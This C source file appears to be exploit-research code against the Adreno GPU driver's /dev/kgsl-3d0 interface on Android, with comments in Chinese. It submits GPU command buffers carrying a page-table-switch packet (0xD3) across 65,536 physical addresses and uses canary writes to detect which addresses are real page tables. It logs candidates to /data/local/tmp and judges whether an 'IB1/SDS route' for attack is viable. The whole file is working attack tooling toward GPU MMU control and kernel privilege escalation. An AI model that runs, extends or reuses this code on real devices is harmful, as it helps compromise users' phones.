/* kgsl_pgscan.c — T1/T2 定判: 4K 细粒度"干净签名"扫描
 * 原理: IB = {0x70D30004 {B,0,0,0}} (switch-only)。
 *   - handler 保护性报错(T2) → 批次死 → canary 提交 EDEADLK → FAULTED
 *   - 切换执行 + B=垃圾(T1+walk fail) → 后续取指 fault → ctx 死 → FAULTED
 *   - 切换执行 + B=真实页表(real pgd / 任何合法表) → 全程正常 → 批次干净退役 → canary OK → CLEAN
 * 判读: 全 FAULTED = handler 报错(T2 实锤, 路线死); 出现 CLEAN = 切换+walk 通路成立(T1 实锤)。
 * 范围: [0x80000000, 0x90000000) 4KB 步进 (65536 探测) — kgsl 页表池早期分配大概率在低区。
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"

static int fd;
static uint64_t g_clsz;
static uint32_t *ib;
static uint64_t ib_ga;
static uint32_t ctx;

static void cache_op(void *start, void *end, int inval) {
    start = (char*)((uintptr_t)start & ~(g_clsz - 1));
    for (; start < end; start += g_clsz) {
        if (inval) __asm volatile("dc civac, %0" : : "r" (start) : "memory");
        else       __asm volatile("dc cvac, %0"  : : "r" (start) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}
static void ctx_create(void) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, _IOWR(0x09, 0x13, struct kgsl_drawctxt_create), &req);
    if (!r) ctx = req.drawctxt_id;
}
static void ctx_recreate(void) {
    ioctl(fd, _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy),
          &(struct kgsl_drawctxt_destroy){ .drawctxt_id = ctx });
    ctx_create();
}
static int gpu_command(uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, _IOWR(0x09, 0x4A, struct kgsl_gpu_command), &req);
}

/* VA 0x40404100 数据访问行为测试(无 switch): fault 还是 silent? */
static void va_test(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map fail\n"); return; }
    ib_ga = m.gpuaddr;
    ctx_create();
    for (int i = 0; i < 3; i++) {
        uint32_t cv = 0x41414141u;
        uint32_t *c = ib;
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
        *c++ = 0x40404100; *c++ = 0;
        *c++ = cv;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x100, 0);
        int r = gpu_command(ib_ga, 16);
        usleep(30000);
        /* canary 判 ctx 存活 */
        c = ib;
        uint32_t cv2 = 0xC0DE0000u | (uint32_t)i;
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
        *c++ = lower_32_bits(ib_ga + 0x800); *c++ = upper_32_bits(ib_ga + 0x800);
        *c++ = cv2;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x100, 0);
        int rc = gpu_command(ib_ga, 16);
        int landed = 0;
        if (!rc) {
            usleep(20000);
            cache_op((uint8_t*)ib + 0x800, (uint8_t*)ib + 0x804, 1);
            landed = (ib[0x200] == cv2);
            ib[0x200] = 0;
            cache_op((uint8_t*)ib + 0x800, (uint8_t*)ib + 0x804, 0);
        } else ctx_recreate();
        printf("VA 0x40404100 写: submit=%d canary_submit=%d landed=%d → %s\n",
               r, rc, landed,
               rc ? "ctx 死(写本身 fault!)" : (landed ? "canary 正常(写被静默丢弃)" : "ghost"));
    }
}

int main(int argc, char **argv) {
    if (argc > 1 && !strcmp(argv[1], "va")) { va_test(); return 0; }
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open fail\n"); return 1; }
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map fail\n"); return 1; }
    ib_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx\n", (unsigned long long)ib_ga);
    ctx_create();

    uint64_t start = argc > 1 ? strtoull(argv[1], NULL, 0) : 0x80000000ull;
    uint64_t count  = argc > 2 ? strtoull(argv[2], NULL, 0) : 65536ull;
    uint64_t end   = start + count * 0x1000;
    uint32_t seq = 0;
    long n_fault = 0, n_clean = 0, n_ghost = 0;
    double t0;
    struct timespec ts0; clock_gettime(CLOCK_MONOTONIC, &ts0);
    t0 = ts0.tv_sec + ts0.tv_nsec / 1e9;

    for (uint64_t B = start; B < end; B += 0x1000) {
        /* 探针: switch-only */
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0xD3, 4);
        *c++ = lower_32_bits(B); *c++ = upper_32_bits(B);
        *c++ = 0; *c++ = 0;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x100, 0);
        int r = gpu_command(ib_ga, 20);
        if (r) { ctx_recreate(); r = gpu_command(ib_ga, 20); }
        usleep(30000);
        /* canary: 真映射写 + 读回验证 */
        uint32_t cv = 0xC0DE0000u | (uint32_t)(seq & 0xFFFF);
        c = ib;
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
        *c++ = lower_32_bits(ib_ga + 0x800); *c++ = upper_32_bits(ib_ga + 0x800);
        *c++ = cv;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x100, 0);
        int rc = gpu_command(ib_ga, 16);
        int state;   /* 0=faulted 1=clean 2=ghost */
        if (rc) { state = 0; ctx_recreate(); }
        else {
            usleep(20000);
            cache_op((uint8_t*)ib + 0x800, (uint8_t*)ib + 0x804, 1);
            state = (ib[0x200] == cv) ? 1 : 2;
            ib[0x200] = 0;
            cache_op((uint8_t*)ib + 0x800, (uint8_t*)ib + 0x804, 0);
        }
        seq++;
        if (state == 0) n_fault++;
        else if (state == 1) {
            n_clean++;
            printf("*** CLEAN: B = 0x%llx (合法表/real pgd?) ***\n", (unsigned long long)B);
            FILE *f = fopen("/data/local/tmp/pgscan_clean.txt", "a");
            if (f) { fprintf(f, "0x%llx\n", (unsigned long long)B); fclose(f); }
        } else n_ghost++;
        if ((seq & 0x3FF) == 0) {
            struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
            double el = ts.tv_sec + ts.tv_nsec / 1e9 - t0;
            printf("  [%7.1fs] %lu/%lu B=0x%llx fault=%lu clean=%lu ghost=%lu\n",
                   el, (unsigned long)((B - start) / 0x1000 + 1),
                   (unsigned long)count, (unsigned long long)B,
                   n_fault, n_clean, n_ghost);
        }
    }
    printf("\n===== 结果: FAULT=%ld CLEAN=%ld GHOST=%ld =====\n", n_fault, n_clean, n_ghost);
    if (n_clean == 0 && n_ghost == 0)
        printf("判定: 全 FAULT → T2 实锤(0xD3 在 IB1 保护性报错, 切换从未发生) → 本设备 IB1/SDS 路线判死\n");
    else if (n_clean > 0)
        printf("判定: 存在 CLEAN → T1 实锤(切换+walk 通路成立) — clean 候选即真实页表/合法表\n");
    return 0;
}
